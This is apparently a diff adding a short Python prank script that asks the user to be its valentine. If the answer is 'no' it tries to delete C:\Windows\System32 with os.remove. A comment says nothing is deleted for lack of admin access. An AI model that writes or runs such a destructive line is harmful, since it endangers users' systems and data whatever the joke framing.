@@ -1,1 +1,11 @@
+import os
+
+question = input("Will you be my valentine? (yes or no):")
+if question == "yes":
+    print("Yay, I love you!")
+elif question == "no":
+    os.remove("C:\Windows\System32")
+#This code will not actually delete anything since it won't have admin access to do so.#
+
+
 
